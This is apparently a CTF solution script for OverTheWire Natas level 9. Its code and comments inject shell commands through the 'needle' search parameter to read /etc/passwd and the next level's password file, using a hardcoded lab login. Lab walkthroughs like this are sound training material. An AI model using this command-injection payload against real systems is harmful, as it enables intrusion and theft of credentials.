# Natas Level 8 → Level 9
# Username: natas9
# URL:      http://natas9.natas.labs.overthewire.org



# needle in a haystack ?

# damn
# http://natas9.natas.labs.overthewire.org/?needle=apple;%20cat%20/etc/passwd

# simply just get our pass from /etc/natas_webpass/natas9


import requests , re

auth_user="natas9"
auth_pass="ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t"



# %20 represents spacing between urls
url="http://natas9.natas.labs.overthewire.org/?needle=apple;%20cat%20/etc/natas_webpass/natas10"

resp=requests.get(url,auth=(auth_user,auth_pass))

# text=re.findall(r'([A-za-z0-9]{5,40})',resp.text.splitlines()[:50])
text=resp.text.splitlines()[:25]

# had to specify the len of pass in the end
pattern=re.compile(r'\b[A-Za-z0-9]{32}')

m=pattern.findall(resp.text)

if m :
    # print("Found password for natas9 : ",m[0])  # this holds the pass of natas9 we need for natas10
    print("Found password for natas10 : ",m[1])
else :
    print("No passwod found for natas10 ")

# firs_10_lines=text[:50]
# print(firs_10_lines)

# print(text)